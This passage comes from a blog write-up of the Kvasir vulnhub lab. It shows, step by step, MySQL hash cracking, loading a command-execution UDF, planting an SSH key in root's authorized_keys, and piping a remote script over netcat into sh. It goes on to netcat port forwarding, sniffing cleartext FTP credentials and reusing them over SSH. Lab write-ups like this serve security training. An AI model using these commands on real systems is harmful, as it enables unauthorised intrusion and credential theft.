<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># first, echo the hash to a file</span>
</span><span class='line'>root@kali:~# <span class="nb">echo</span> <span class="s2">&quot;ECB01D78C2FBEE997EDA584C647183FD99C115FD&quot;</span> &gt; db.root
</span><span class='line'>
</span><span class='line'><span class="c"># next, we tell hash cat the type of hash we have and wait a few seconds :)</span>
</span><span class='line'>root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt
</span><span class='line'>This copy of hashcat will expire on 01.01.2015. Please upgrade to <span class="k">continue </span>using hashcat.
</span><span class='line'>
</span><span class='line'>Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...
</span><span class='line'>
</span><span class='line'>Added hashes from file db.root: 1 <span class="o">(</span>1 salts<span class="o">)</span>
</span><span class='line'>Activating quick-digest mode <span class="k">for </span>single-hash
</span><span class='line'>
</span><span class='line'>NOTE: press enter <span class="k">for </span>status-screen
</span><span class='line'>
</span><span class='line'>ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater
</span><span class='line'>
</span><span class='line'>All hashes have been recovered
</span><span class='line'>
</span><span class='line'>Input.Mode: Dict <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
</span><span class='line'>Index.....: 1/5 <span class="o">(</span>segment<span class="o">)</span>, 3627099 <span class="o">(</span>words<span class="o">)</span>, 33550339 <span class="o">(</span>bytes<span class="o">)</span>
</span><span class='line'>Recovered.: 1/1 hashes, 1/1 salts
</span><span class='line'>Speed/sec.: - plains, 3.27M words
</span><span class='line'>Progress..: 281260/3627099 <span class="o">(</span>7.75%<span class="o">)</span>
</span><span class='line'>Running...: --:--:--:--
</span><span class='line'>Estimated.: 00:00:00:01
</span><span class='line'>
</span><span class='line'>Started: Sun Nov  9 14:07:14 2014
</span><span class='line'>Stopped: Sun Nov  9 14:07:14 2014
</span></code></pre></td></tr></table></div></figure>


<p>The password for the MySQL <code>root</code> user is therefore <code>coolwater</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;show grants;&#39;</span>
</span><span class='line'>Grants <span class="k">for </span>root@192.168.2.100
</span><span class='line'>GRANT ALL PRIVILEGES ON *.* TO <span class="s1">&#39;root&#39;</span>@<span class="s1">&#39;192.168.2.100&#39;</span> IDENTIFIED BY PASSWORD <span class="s1">&#39;*ECB01D78C2FBEE997EDA584C647183FD99C115FD&#39;</span> WITH GRANT OPTION
</span></code></pre></td></tr></table></div></figure>


<h3>loading the UDF remotely</h3>

<p>With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.</p>

<p>I grabbed a copy of a <code>do_system()</code> UDF that I have previously used successfully from <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">here</a>, called <code>raptor_udf.c</code>. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the <code>web</code> host. Compilation was done on the <code>web</code> host with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gcc -g -c raptor_udf.c -fPIC
</span><span class='line'>gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
</span></code></pre></td></tr></table></div></figure>


<p>This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word <code>uploading</code> sounds trivial, however its not. I need to know <em>where</em> to first. For this, I enumerate the MySQL <code>plugin_dir</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;select @@plugin_dir;&#39;</span>
</span><span class='line'>@@plugin_dir
</span><span class='line'>/usr/lib/mysql/plugin/
</span></code></pre></td></tr></table></div></figure>


<p>So this means I need to write the udf to <code>/usr/lib/mysql/plugin/raptor_udf.so</code>. Fair enough. But how do I write this? Well there are many approaches to this. One is to use <code>--local-infile=1</code> as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the <strong>local</strong> file to wherever (a table in our case) and then to a file via <code>INTO DUMPFILE</code>. The other option is to simply convert the content to hex, and run <code>SELECT 0x</code> + <code>&lt;CONTENT AS HEX&gt;</code> + <code>INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so</code>.</p>

<p>I opted for the content encoding as hex and generated a <code>xxd</code> output of the compiled <code>raptor_udf.so</code>. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of <code>Undefined Symbol "do_system" in raptor_udf.so</code>. :\</p>

<p>Eventually, I opted to find a precompiled 64bit <code>.so</code> to upload, and found one in the <a href="https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so">sqlmap repository</a>. I downloaded this and converted it to hex using <code>xxd</code>. I then created the following file with the mysql commands to run on the <code>web</code> host from my attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat load_udf.sh
</span><span class='line'>touch log
</span><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;use mysql; select 0x7f454</span>
</span><span class='line'>
</span><span class='line'><span class="s1">    [... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]</span>
</span><span class='line'>
</span><span class='line'><span class="s1">0000000000000 into dumpfile &quot;/usr/lib/mysql/plugin/raptor_udf.so&quot;;&#39;</span> 2&gt;&gt; log
</span><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;create function sys_exec returns integer soname &quot;raptor_udf.so&quot;;&#39;</span> 2&gt;&gt; log
</span><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;use mysql; select * from mysql.func;&#39;</span> 2&gt;&gt; log
</span><span class='line'>
</span><span class='line'><span class="c"># this adds me a SSH key to roots authorized keys using the command execution udf we have prepared</span>
</span><span class='line'>mysql -uroot -pcoolwater -h 192.168.2.200 -e <span class="s1">&#39;select sys_exec(&quot;echo \&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W8Vu9F68nqmIYyk3hBlydwbOkevh/HfsNm50pd7ZZPK/mpAdZxYYxfBcvUQcWmgtw49ihTAJGh5KZJM/pL4xCw/meavFXy01SX7TZNAmrxcn6FDcXQJ6DC+TUMWXigxcCwntKxSHChyTiDB\&quot; &gt; /root/.ssh/authorized_keys&quot;)&#39;</span> 2&gt;&gt; log
</span></code></pre></td></tr></table></div></figure>


<p>With this file ready, I opened a netcat port to pipe it to, and read it on <code>web</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># on the attacking machine, I opened netcat with my mysql commands</span>
</span><span class='line'>root@kali:~# nc -lvp 4444 &lt; load_udf.sh
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
</span><span class='line'>
</span><span class='line'><span class="c"># then on the original netcat shell I have, read it</span>
</span><span class='line'>timeout 3 nc 192.168.56.101 4444 <span class="p">|</span> sh
</span><span class='line'>name    ret dl  <span class="nb">type</span>
</span><span class='line'>sys_exec    2   raptor_udf.so   <span class="k">function</span>
</span><span class='line'>sys_exec<span class="o">(</span><span class="err">&quot;</span><span class="nb">echo</span> <span class="se">\&quot;</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W
</span><span class='line'>0
</span></code></pre></td></tr></table></div></figure>


<p>The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of <code>0</code>, indicating that it was successful. I specify the <code>timeout</code> command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)</p>

<h2>ssh to db host</h2>

<p>With all that done, I have my public key for the <code>root</code> user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I <em>get</em> to 192.168.2.200&rsquo;s port 22? :)</p>

<p>For that, I decided to look at <code>netcat</code> port forwarding! But first, lets read some man pages:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#from nc(1)</span>
</span><span class='line'>OPTIONS
</span><span class='line'>       -c string    specify shell commands to <span class="nb">exec </span>after connect <span class="o">(</span>use with caution<span class="o">)</span>.
</span></code></pre></td></tr></table></div></figure>


<p><em>&ldquo;use with caution&rdquo;</em>. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!</p>

<p><img src="https://i.imgur.com/7IggbMC.jpg"></p>

<p>Lets see this in action. First I setup the initial listener on the attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># listen on tcp/4444, re-listening on tcp/222 on a new connection</span>
</span><span class='line'>root@kali:~# nc -lvp 4444 -c <span class="s2">&quot;nc -lvp 222&quot;</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
</span></code></pre></td></tr></table></div></figure>


<p>With the listener setup, lets issue a new <code>nc</code> command in the initial shell that I got on <code>web</code>, connecting the dots:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>nc 192.168.56.101 4444 -c <span class="s2">&quot;nc 192.168.2.200 22&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>When this runs, the initial listener will see the new connection, and I should have the <code>tcp/22</code> of <strong>192.168.2.200</strong> now forwarded locally:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvp 4444 -c <span class="s2">&quot;nc -lvp 222&quot;</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
</span><span class='line'>
</span><span class='line'><span class="c"># connection comes in from 192.168.1.100</span>
</span><span class='line'>192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>connect to <span class="o">[</span>192.168.56.101<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.102<span class="o">]</span> 53870
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 222 ...
</span></code></pre></td></tr></table></div></figure>


<p>Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:</p>

<p><img src="https://i.imgur.com/A2463Kc.png"></p>

<p>Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -D 8000 root@127.0.0.1 -p222 -i kvasir_key
</span><span class='line'>Linux db 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Nov  9 07:13:17 2014 from 192.168.2.100
</span><span class='line'>root@db:~#
</span></code></pre></td></tr></table></div></figure>


<p>I added the <code>-D</code> option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a <em>almost</em> <em>direct</em> connection to the <code>db</code> (192.168.2.200) host, as denoted in green below:</p>

<p><img src="https://i.imgur.com/wHNJJ5g.png"></p>

<p>8-)</p>

<h2>not exactly nsa level spying but heh</h2>

<p>Initial enumeration revealed that this host (<code>db</code>) had 2 network interfaces. One with IP <strong>192.168.2.200</strong> (the one I came in from), and another with IP <strong>192.168.3.200</strong>. There were also 2 entries in <code>/etc/hosts</code> about 2 hosts in the 3.x network:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# cat /etc/hosts
</span><span class='line'><span class="c"># 192.168.3.40  celes</span>
</span><span class='line'><span class="c"># 192.168.3.50  terra</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# ps -ef
</span><span class='line'>UID        PID  PPID  C STIME TTY          TIME CMD
</span><span class='line'>root         1     0  0 Nov08 ?        00:00:00 init <span class="o">[</span>3<span class="o">]</span>
</span><span class='line'>root      1242     1  0 Nov08 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
</span><span class='line'>root      1408     1  0 Nov08 ?        00:00:00 /usr/sbin/sshd
</span><span class='line'>root      1434     1  0 Nov08 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
</span><span class='line'>root      1761  1434  0 Nov08 ?        00:00:37 /usr/sbin/mysqld --basedir<span class="o">=</span>/usr --datadir<span class="o">=</span>/var/lib/mysql --plugin-dir<span class="o">=</span>/usr/lib/mysql/plugin --user<span class="o">=</span>root --pid-file<span class="o">=</span>/var/run/mysqld/mysqld
</span><span class='line'>root      1762  1434  0 Nov08 ?        00:00:00 logger -t mysqld -p daemon.error
</span><span class='line'>root      1861     1  0 Nov08 ?        00:00:00 pure-ftpd <span class="o">(</span>SERVER<span class="o">)</span>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>A interesting file was in <code>/root/.words.txt</code>, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# head /root/.words.txt
</span><span class='line'>borne
</span><span class='line'>precombatting
</span><span class='line'>noncandescent
</span><span class='line'>cushat
</span><span class='line'>lushness
</span><span class='line'>precensure
</span><span class='line'>romishness
</span><span class='line'>nonderivable
</span><span class='line'>overqualification
</span><span class='line'>superkojiman
</span></code></pre></td></tr></table></div></figure>


<p>And finally, a troll flag :D</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# cat /root/flag
</span><span class='line'>This is not the flag you<span class="err">&#39;</span>re looking <span class="k">for</span>... :p
</span></code></pre></td></tr></table></div></figure>


<p>This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user <code>celes</code> in <code>/etc/pure-ftpd/pureftpd.passwd</code>, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.</p>

<p>At one stage, I was checking to see what network activity was present on the interfaces, of which <code>eth0</code> had my SSH session, and <code>eth1</code> was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# tcpdump -i eth1
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth1, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>13:19:01.355970 IP 192.168.3.40.36425 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>S<span class="o">]</span>, seq 2471029534, win 14600, options <span class="o">[</span>mss 1460,sackOK,TS val 13092832 ecr 0,nop,wscale 5<span class="o">]</span>, length 0
</span><span class='line'>13:19:01.355988 IP 192.168.3.200.ftp &gt; 192.168.3.40.36425: Flags <span class="o">[</span>S.<span class="o">]</span>, seq 2507516314, ack 2471029535, win 14480, options <span class="o">[</span>mss 1460,sackOK,TS val ack 535, win 490, options <span class="o">[</span>nop,nop,TS val 13092837 ecr 13092836<span class="o">]</span>, length 0
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>13:19:01.378604 IP 192.168.3.200.ftp &gt; 192.168.3.40.36425: Flags <span class="o">[</span>P.<span class="o">]</span>, seq 535:548, ack 53, win 453, options <span class="o">[</span>nop,nop,TS val 13092837 ecr 13092837<span class="o">]</span>, length 13
</span><span class='line'>13:19:01.378631 IP 192.168.3.40.36425 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>R<span class="o">]</span>, seq 2471029587, win 0, length 0
</span><span class='line'>^C
</span><span class='line'>29 packets captured
</span><span class='line'>29 packets received by filter
</span><span class='line'>0 packets dropped by kernel
</span></code></pre></td></tr></table></div></figure>


<p>I changed the command to add the <code>-X</code> flag as this looked like FTP traffic flowing over the interface (you haven&rsquo;t forgotten the ftp server yet have you?).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>13:25:01.387981 IP 192.168.3.200.ftp &gt; 192.168.3.40.36437: Flags <span class="o">[</span>P.<span class="o">]</span>, seq 321:359, ack 13, win 453, options <span class="o">[</span>nop,nop,TS val 13182840 ecr 13182839<span class="o">]</span>, length 38
</span><span class='line'>    0x0000:  4510 005a 7e22 4000 4006 342b c0a8 03c8  E..Z~<span class="err">&quot;</span>@.@.4+....
</span><span class='line'>    0x0010:  c0a8 0328 0015 8e55 1bf0 5a96 015a 5499  ...<span class="o">(</span>...U..Z..ZT.
</span><span class='line'>    0x0020:  8018 01c5 42a1 0000 0101 080a 00c9 2778  ....B.........<span class="s1">&#39;x</span>
</span><span class='line'><span class="s1">    0x0030:  00c9 2777 3333 3120 5573 6572 2063 656c  ..&#39;</span>w331.User.cel
</span><span class='line'>    0x0040:  6573 204f 4b2e 2050 6173 7377 6f72 6420  es.OK..Password.
</span><span class='line'>    0x0050:  7265 7175 6972 6564 0d0a                 required..
</span><span class='line'>
</span><span class='line'>13:25:01.388050 IP 192.168.3.40.36437 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>P.<span class="o">]</span>, seq 13:32, ack 359, win 490, options <span class="o">[</span>nop,nop,TS val 13182840 ecr 13182840<span class="o">]</span>, length 19
</span><span class='line'>    0x0000:  4500 0047 73fe 4000 4006 3e72 c0a8 0328  E..Gs.@.@.&gt;r...<span class="o">(</span>
</span><span class='line'>    0x0010:  c0a8 03c8 8e55 0015 015a 5499 1bf0 5abc  .....U...ZT...Z.
</span><span class='line'>    0x0020:  8018 01ea a5ae 0000 0101 080a 00c9 2778  ..............<span class="s1">&#39;x</span>
</span><span class='line'><span class="s1">    0x0030:  00c9 2778 5041 5353 2069 6d32 3242 4634  ..&#39;</span>xPASS.im22BF4
</span><span class='line'>    0x0040:  4858 6e30 310d 0a                        HXn01..
</span></code></pre></td></tr></table></div></figure>


<p>A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the <code>-W</code> flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.</p>

<p><img src="https://i.imgur.com/YiwWzsy.png"></p>

<p>It seems like <code>celes</code> is simply logging in, getting a directory listing, and logging out.</p>

<p>Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to <strong>192.168.3.40</strong> (the ip the FTP conversation was coming from) using <code>celes:im22BF4HXn01</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# ssh celes@192.168.3.40
</span><span class='line'>celes@192.168.3.40<span class="err">&#39;</span>s password: <span class="c"># entered im22BF4HXn01</span>
</span><span class='line'>Linux dev1 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have mail.
</span><span class='line'>Last login: Thu Sep  4 09:20:00 2014
</span><span class='line'>celes@dev1:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>finding terras secret</h2>

<p>Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:</p>

<p><img src="https://i.imgur.com/nXpoEBM.png"></p>

<p>I don’t have connectivity directly to <strong>192.168.3.40</strong> at the moment, but if I really need that I can arrange it. For now, lets see what we have on <code>dev1</code>.</p>

<p>First, I find the sneaky ftp session script <code>getLogs.py</code>, that does exactly that which we I in the packet captures. Next, I find a message in <code>celes</code> mailbox:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span>cat /var/spool/mail/celes
</span><span class='line'>Return-path: &lt;celes@localhost&gt;
</span><span class='line'>Received: from celes by localhost with <span class="nb">local</span> <span class="o">(</span>Exim 4.80<span class="o">)</span>
</span><span class='line'>    <span class="o">(</span>envelope-from &lt;celes@localhost&gt;<span class="o">)</span>
</span><span class='line'>    id 1XHczw-0000V2-8y
</span><span class='line'>    <span class="k">for </span>celes@127.0.0.1<span class="p">;</span> Wed, 13 Aug 2014 19:10:08 +0100
</span><span class='line'>Date: Wed, 13 Aug 2014 19:10:08 +0100
</span><span class='line'>To: celes@127.0.0.1
</span><span class='line'>Subject: Reminder
</span><span class='line'>User-Agent: Heirloom mailx 12.5 6/20/10
</span><span class='line'>MIME-Version: 1.0
</span><span class='line'>Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
</span><span class='line'>Content-Transfer-Encoding: 7bit
</span><span class='line'>Message-Id: &lt;E1XHczw-0000V2-8y@localhost&gt;
</span><span class='line'>From: celes@localhost
</span><span class='line'>
</span><span class='line'>Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine... *sigh*
</span></code></pre></td></tr></table></div></figure>


<p>The message reveals that Terra has a puzzle on her machine (<strong>192.168.3.50</strong> from <code>/etc/hosts</code> on the <code>db</code> server?). She also mentions <code>kvasir.png</code>, which happens to be in <code>celese</code> home directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span>ls -lah kvasir.png
</span><span class='line'>-rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
</span></code></pre></td></tr></table></div></figure>


<p>Lastly, the <code>.bash_history</code> for <code>celese</code> has a entry <code>stepic --help</code>. <code>stepic</code> is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra&rsquo;s machine. So, I converted the <code>kvasir.png</code> image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using <code>xxd -r -p kvasir.png.xxd &gt; kvasir.png</code>.</p>

<p><img src="https://i.imgur.com/DKIbriL.png"></p>

<h3>getting stepic to play nice</h3>

<p>With the image ready, I searched for <code>stepic</code> using <code>pip</code> in my virtual env and installed it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
